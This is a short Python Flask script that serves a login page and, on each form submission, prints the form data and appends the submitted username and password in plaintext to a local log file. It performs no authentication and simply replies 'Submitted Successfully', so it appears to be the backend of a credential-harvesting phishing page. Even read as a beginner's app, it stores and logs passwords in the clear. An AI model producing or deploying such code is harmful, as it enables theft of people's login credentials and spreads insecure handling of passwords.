from flask import Flask, request
import datetime

app = Flask(__name__)

@app.route("/")
def home():
    return open("login.html").read()

@app.route("/login", methods=["POST"])
def login():
    print("DEBUG:", request.form)   # 👈 ADD IT HERE

    username = request.form.get("username")
    password = request.form.get("password")

    with open("log.txt", "a") as f:
        f.write(f"Username: {username}\n")
        f.write(f"Password: {password}\n")

    return "Submitted Successfully"

app.run(host="0.0.0.0", port=5000)
